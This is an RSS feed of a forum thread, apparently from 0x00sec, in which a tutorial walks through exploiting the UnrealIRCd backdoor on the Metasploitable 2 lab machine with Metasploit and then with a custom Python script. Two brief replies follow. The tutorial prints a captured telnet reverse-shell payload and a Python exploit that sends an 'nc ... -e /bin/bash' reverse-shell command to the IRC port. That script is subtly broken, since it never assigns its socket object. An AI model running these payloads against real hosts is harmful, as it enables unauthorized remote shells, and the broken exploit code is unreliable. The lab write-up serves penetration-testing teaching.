<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Metasploitable 2 How-to - IRC Backdoor exploitation ( Metasploit &amp; python )</title>
    <link>https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931</link>
    <description># Metasploitable  2 - IRC Backdoor

The first tutorial on Metasploitable 2 was about the vsftp backdoor, in this post we will talk about the IRC Backdoor.

In the first part of this *&quot;How to&quot;* we will run the **Metasploit** exploit ( The skid way ).
The second part we will write our own python exploit to trigger the  backdoor

#The Metasploit way

The first thing we need to do is a scan of the machine to see the open port ([nmap example](https://0x00sec.org/t/metasploitable-2-how-to-lab-setup-and-vsftp-backdoor/219))

We know that irc is on the 6667, let&#39;s use the -sV argument to see the version of the server 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/faad2d496eb5e336eb9b69e73791013109606465.jpg&quot; width=&quot;690&quot; height=&quot;454&quot;&gt;

The version here is Unreal ircd, let&#39;s run msfconsole and search for the exploit 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/7e8aad08adc5960176e1571d71a831b99bfcfd53.jpg&quot; width=&quot;690&quot; height=&quot;156&quot;&gt;

We just need to set the RHOST and to use this exploit 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/ce4970196f7124bb6ef27bd20648e71286fcd0c3.jpg&quot; width=&quot;573&quot; height=&quot;418&quot;&gt;

Now we just need to run &quot;exploit -j&quot; and wait to attach to the session 

&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/2/209b9daa29f2c2ca86e91c0769dfd27ec99d2633.jpg&#39;&gt;

You&#39;re done you have succefully exploited the metasploit 2 Machine !

# Understanding the exploit 

The first part was really easy  but let&#39;s read the code to understand how it works

Let&#39;s focus on this part 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/b/b113efb660d6f6aed9a1b70656711960f4dd8886.jpg&quot; width=&quot;419&quot; height=&quot;365&quot;&gt;

Even if you don&#39;t understand ruby you can understand how the exploit work

Metasploit will connect to the host and send 

`AB; the payload\n`

This will trigger the backdoor and run whatever the payload is 

## Sniffing with wireshark 

Let&#39;s try to run the exploit and sniff the network with wireshark 


&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/f64fce2afec2fc3d77ceb345e5a76285aeafeb05.png&quot; width=&quot;690&quot; height=&quot;176&quot;&gt;

As you can see we have the `AB; sh`

Let&#39;s select the 2nd packet and go deeper 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/0f1b3c7bd22601807ab2a3222e5a4ce179cf734f.png&quot; width=&quot;690&quot; height=&quot;445&quot;&gt;

Here we see the complete  payload 

`sh -c &#39;(sleep 3862|telnet ip port| while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet ip port &gt; /dev/null 2&gt;&amp;1 &amp;)&#39;`

This payload is a reverse shell

Now that we know how the exploit works it&#39;s time to write our own implementation with python

#IRC Unreal Python

The Python script will just send the backdoor command to the irc server, we will use a netcat listener to get a reverse shell 

```Python
#!/usr/bin/python
import socket
import argparse

parser = argparse.ArgumentParser(description=&#39;Python implementation of the Unreal IRC backdoor&#39;)
parser.add_argument(&#39;-i&#39;, &#39;--host&#39;,help=&quot;Ip of the victim&quot;)
parser.add_argument(&#39;-p&#39;,&#39;--port&#39; ,help=&quot;Port of the netcat listener&quot;)
arg =parser.parse_args()

socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socket.connect((arg.host,6667))  # Connect to the irc server
socket.recv(2048) # Receive the response of the server
socket.send(&quot;AB; sh -c &#39;(nc yourip&quot; + &quot; &quot; + arg.port + &quot; -e /bin/bash) &#39;\n&quot;)
socket.close()
```

run the script 

`./unreal_irc.py -i 172.28.128.3 -p 1337`
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/fd9011299ba8fbff626db5977773836d2498cc1d.jpg&quot; width=&quot;559&quot; height=&quot;108&quot;&gt;

And here you go :)</description>
    
    <lastBuildDate>Wed, 26 Apr 2017 19:55:28 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Metasploitable 2 How-to - IRC Backdoor exploitation ( Metasploit &amp; python )</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931/3</link>
        <pubDate>Sun, 21 Jan 2018 00:42:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1931-3</guid>
        <source url="https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931.rss">Metasploitable 2 How-to - IRC Backdoor exploitation ( Metasploit &amp; python )</source>
      </item>
      <item>
        <title>Metasploitable 2 How-to - IRC Backdoor exploitation ( Metasploit &amp; python )</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I am a fan of how you looked a bit closer at how it works, and how to do it yourself.</p>
<p>I would be interested in a tutorial on how to code a module for metasploit, for example converting scripts into a module. Metasploit can be a very useful framework, it isn’t all about the built in modules.</p>
<p>Many underestimate the power of metasploit, but it can be a very useful tool when used properly.</p>
<p>Nice article!</p>
          <p><a href="https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931/2</link>
        <pubDate>Wed, 26 Apr 2017 19:55:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1931-2</guid>
        <source url="https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931.rss">Metasploitable 2 How-to - IRC Backdoor exploitation ( Metasploit &amp; python )</source>
      </item>
      <item>
        <title>Metasploitable 2 How-to - IRC Backdoor exploitation ( Metasploit &amp; python )</title>
        <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
        <description><![CDATA[
            <h1>Metasploitable  2 - IRC Backdoor</h1>
<p>The first tutorial on Metasploitable 2 was about the vsftp backdoor, in this post we will talk about the IRC Backdoor.</p>
<p>In the first part of this <em>“How to”</em> we will run the <strong>Metasploit</strong> exploit ( The skid way ).<br>
The second part we will write our own python exploit to trigger the  backdoor</p>
<p><span class="hashtag">#The</span> Metasploit way</p>
<p>The first thing we need to do is a scan of the machine to see the open port (<a href="https://0x00sec.org/t/metasploitable-2-how-to-lab-setup-and-vsftp-backdoor/219">nmap example</a>)</p>
<p>We know that irc is on the 6667, let’s use the -sV argument to see the version of the server</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/faad2d496eb5e336eb9b69e73791013109606465.jpg" width="690" height="454"></p>
<p>The version here is Unreal ircd, let’s run msfconsole and search for the exploit</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7e8aad08adc5960176e1571d71a831b99bfcfd53.jpg" width="690" height="156"></p>
<p>We just need to set the RHOST and to use this exploit</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/ce4970196f7124bb6ef27bd20648e71286fcd0c3.jpg" width="573" height="418"></p>
<p>Now we just need to run “exploit -j” and wait to attach to the session</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/209b9daa29f2c2ca86e91c0769dfd27ec99d2633.jpg" width="" height=""></p>
<p>You’re done you have succefully exploited the metasploit 2 Machine !</p>
<h1>Understanding the exploit</h1>
<p>The first part was really easy  but let’s read the code to understand how it works</p>
<p>Let’s focus on this part</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b113efb660d6f6aed9a1b70656711960f4dd8886.jpg" width="419" height="365"></p>
<p>Even if you don’t understand ruby you can understand how the exploit work</p>
<p>Metasploit will connect to the host and send</p>
<p><code>AB; the payload\n</code></p>
<p>This will trigger the backdoor and run whatever the payload is</p>
<h2>Sniffing with wireshark</h2>
<p>Let’s try to run the exploit and sniff the network with wireshark</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f64fce2afec2fc3d77ceb345e5a76285aeafeb05.png" width="690" height="176"></p>
<p>As you can see we have the <code>AB; sh</code></p>
<p>Let’s select the 2nd packet and go deeper</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0f1b3c7bd22601807ab2a3222e5a4ce179cf734f.png" width="690" height="445"></p>
<p>Here we see the complete  payload</p>
<p><code>sh -c '(sleep 3862|telnet ip port| while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet ip port &gt; /dev/null 2&gt;&amp;1 &amp;)'</code></p>
<p>This payload is a reverse shell</p>
<p>Now that we know how the exploit works it’s time to write our own implementation with python</p>
<p><span class="hashtag">#IRC</span> Unreal Python</p>
<p>The Python script will just send the backdoor command to the irc server, we will use a netcat listener to get a reverse shell</p>
<pre><code class="lang-auto">#!/usr/bin/python
import socket
import argparse

parser = argparse.ArgumentParser(description='Python implementation of the Unreal IRC backdoor')
parser.add_argument('-i', '--host',help="Ip of the victim")
parser.add_argument('-p','--port' ,help="Port of the netcat listener")
arg =parser.parse_args()

socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socket.connect((arg.host,6667))  # Connect to the irc server
socket.recv(2048) # Receive the response of the server
socket.send("AB; sh -c '(nc yourip" + " " + arg.port + " -e /bin/bash) '\n")
socket.close()
</code></pre>
<p>run the script</p>
<p><code>./unreal_irc.py -i 172.28.128.3 -p 1337</code><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/f/fd9011299ba8fbff626db5977773836d2498cc1d.jpg" width="559" height="108"></p>
<p>And here you go <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931/1</link>
        <pubDate>Wed, 26 Apr 2017 16:45:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1931-1</guid>
        <source url="https://0x00sec.org/t/metasploitable-2-how-to-irc-backdoor-exploitation-metasploit-python/1931.rss">Metasploitable 2 How-to - IRC Backdoor exploitation ( Metasploit &amp; python )</source>
      </item>
  </channel>
</rss>
